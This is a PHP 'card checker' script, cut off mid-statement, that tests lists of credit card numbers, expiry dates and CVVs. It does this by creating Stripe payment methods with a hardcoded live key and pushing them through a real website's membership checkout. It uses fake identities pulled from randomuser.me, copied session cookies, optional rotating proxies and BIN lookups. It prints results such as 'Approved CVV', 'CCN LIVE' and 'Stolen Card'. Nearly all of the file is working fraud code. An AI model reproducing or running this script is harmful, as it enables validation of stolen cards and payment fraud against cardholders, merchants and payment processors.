<?php 

require 'function.php';

error_reporting(0);
date_default_timezone_set('America/New_York');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];


function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//////////======= Webshare
// $Webshare = rand(0,250);
// $rp1 = array(
//   1 => '8e4a7166-1253886:fpkpypkoz9q',
//   // 2 => '8e4a7166-1253886:fpkpypkoz9q',
//   // 3 => '8e4a7166-1253886:fpkpypkoz9q',
//   // 4 => '8e4a7166-1253886:fpkpypkoz9q',
//   // 5 => '8e4a7166-1253886:fpkpypkoz9q',
// ); 
// $rotate = $rp1[array_rand($rp1)];
// ///////////=======Proxy Checker
// $ch = curl_init('https://api.ipify.org/');
// curl_setopt_array($ch, [
// CURLOPT_RETURNTRANSFER => true,
// CURLOPT_PROXY => 'http://web share url here:31112',
// CURLOPT_PROXYUSERPWD => $rotate,
// CURLOPT_HTTPGET => true,
// ]);
// $ip1 = curl_exec($ch);
// curl_close($ch);
// ob_flush();
// if (isset($ip1)){
// $ip = "Proxy Live ✅";
// }
// if (empty($ip1)){
// $ip = "Proxy Dead ❌";
// }

// echo '[ IP: '.$ip.' ] <br>';
////////////////////////////===[1 Req]

$ch = curl_init();
// curl_setopt($ch, CURLOPT_PROXY, "web share url of proxy  ");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

////////////////////////////===[1 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=0e779e62-56b6-48b1-8d21-0a0ffc7d4b65a85eac&muid=48e1fd4c-f08f-4337-8ec3-cf8c81f86a04f2e52b&sid=ed391b3e-9e16-46fb-8960-73a370f521c5b41112&pasted_fields=number&payment_user_agent=stripe.js%2F8f6e154302%3B+stripe-js-v3%2F8f6e154302&time_on_page=67882&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1JfJIKGQPjBo1DYE');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));

////////////////////////////===[2 Req]

$ch = curl_init();
// curl_setopt($ch, CURLOPT_PROXY, "web share url of proxy ");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.traveldailymedia.com/membership-account-2/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.traveldailymedia.com',
'method: POST',
'path: /membership-account-2/membership-checkout/',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'cookie: wordpress_google_apps_login=7c62f8e6b3b716ff5a81537ec9d2a0c0; PHPSESSID=58kekc0f55p7q7bp3fpr26lcic; pmpro_visit=1; _ga=GA1.2.929890242.1681505212; _gid=GA1.2.805837493.1681505213; ln_or=eyIxNjc1MTUsNDY1MTc5IjoiZCJ9; __stripe_mid=48e1fd4c-f08f-4337-8ec3-cf8c81f86a04f2e52b; __stripe_sid=ed391b3e-9e16-46fb-8960-73a370f521c5b41112; __gads=ID=6efbedd72084c7f0-220b7f5dadde00ed:T=1681505216:RT=1681505216:S=ALNI_MaJFDsJppBRj7hntREgU9a6ZlVjdg; __gpi=UID=00000bf49273b10b:T=1681505216:RT=1681505216:S=ALNI_MYlFwDcgPXzF-OrEeBqWZWWRDtP0g; __hstc=18788902.f88831efffd88c433178cbf786240c9c.1681505221179.1681505221179.1681505221179.1; hubspotutk=f88831efffd88c433178cbf786240c9c; __hssrc=1; __hssc=18788902.1.1681505221180',
'origin: https://www.traveldailymedia.com',
'referer: https://www.traveldailymedia.com/membership-account-2/membership-checkout/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
));

////////////////////////////===[2 Req Postfields]
 
curl_setopt($ch, CURLOPT_POSTFIELDS,'level=2&checkjavascript=1&other_discount_code=&username=animelover&password=%409qKWTd38&password2=%409qKWTd38&bemail=animelover%40gmail.com&bconfirmemail=animelover%40gmail.com&fullname=&CardType=mastercard&discount_code=&user_id=0&submit-checkout=1&javascriptok=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX1086&ExpirationMonth=09&ExpirationYear=2028');



$result2 = curl_exec($ch);
$token = trim(strip_tags(getStr($result2,'"id": "','"')));

////////////////////////////===[BIN Info]

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['name'];
$emoji = $fim['country']['emoji'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}

////////////////////////////===[Responses]===////////////////////////////

if
(strpos($result2,  '"cvc_check": "pass"')) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Approved CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  "Thank You For Donation.")) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Approved CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}
elseif
(strpos($result2,  '"Thank You For Donation."')) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Approved CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  "Thank You.")) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Approved CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  'Error updating default payment method. Your card zip code is incorrect.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Approved CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
} 
elseif
(strpos($result2,  '/donations/thank_you?donation_number=','')) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Approved CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  "incorrect_zip")) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Approved CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  '"type":"one-time"')) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Approved CVV ▸ 𝘈𝘱𝘱𝘳𝘰𝘷𝘦𝘥 𝘊𝘷𝘷</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  'Error updating default payment method. Your card security code is incorrect.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>  Response: CCN LIVE✅</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  "Error updating default payment method. Your card's security code is incorrect.")) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>  Response: CCN LIVE✅</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  'Error updating default payment method. Your card security code is invalid.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Invalid CVC ❌</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  "Error updating default payment method. Your card's security code is invalid.")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Invalid CVC ❌</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  'Error updating default payment method. Your card&#039;s security code is incorrect.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Response: CCN LIVE✅</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  "incorrect_cvc")) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Response: CCN LIVE✅</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  "stolen_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Stolen Card ❌</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  "lost_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Lost Card ❌</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  'Error updating default payment method. Your card has insufficient funds.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Insufficient Funds ▸cc check by 👻GHOST ⛩️</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  "pickup_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Pickup Card ❌</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  "insufficient_funds")) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Insufficient Funds ▸cc check by 👻GHOST ⛩️</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "fail"')) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Response: CCN LIVE✅</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  'security code is invalid.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Response: CCN LIVE✅</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  'Error updating default payment method. Your card&#039;s security code is incorrect.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Response: CCN LIVE✅</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  "incorrect_cvc")) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Response: CCN LIVE✅</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  "stolen_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Stolen Card ❌</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  "lost_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Lost Card ❌</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  'Error updating default payment method. Your card has insufficient funds.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Insufficient Funds ▸cc check by 👻GHOST ⛩️</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  "pickup_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Pickup Card ❌</i></font><br> <font class='badge badge-info'>▸ $bank  $country ▸ 👻GHOST </i></font><br>";
}

elseif
(strpos($result2,  "insufficient_funds")) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Insufficient Funds ▸cc check by 👻GHOST ⛩️</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Error updating default payment method. Your card has expired.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Card Expired ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Error updating default payment method. Your card number is incorrect.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Incorrect Card Number ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "incorrect_number")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Incorrect Card Number ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Error updating default payment method. Your card was declined.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Card Declined ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "generic_decline")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Generic Decline ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "do_not_honor")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Do Not Honor ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "Error updating default payment method. expired_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Expired Card ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Error updating default payment method. Your card does not support this type of purchase.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Result : | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Response: Card Doesnt Support This Purchase ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "processing_error")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Processing Error ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2, "service_not_allowed")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Service Not Allowed ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "unchecked"')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>CVC Check Unavailable ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  '"cvc_check": "unavailable"')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>CVC Check Unavailable ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "parameter_invalid_empty")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Declined: Missing Card Details ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "lock_timeout")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Another Request In Process: Card Not Checked ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "Error updating default payment method. transaction_not_allowed")) {
  echo "<font size=2 color='red'>  <font class='badge badge-success'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Transaction Not Allowed ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2, "three_d_secure_redirect")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>3D Secure Redirect ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Card is declined ▸cc check by your bank, please contact them for additional information.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>3D Secure Redirect ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2, "missing_payment_information")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Missing Payment Informations ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Missing Credit Card Number ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Error updating default payment method. Your card has expired.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Card Expired ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Error updating default payment method. Your card number is incorrect.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Incorrect Card Number ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  "Error updating default payment method. incorrect_number")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Incorrect Card Number ❌</i></font><br> <font class='badge badge-info'>$bank ▫️ $country ▫️ $ip</i></font><br>";
}

elseif
(strpos($result2,  'Your card was declined.')) {
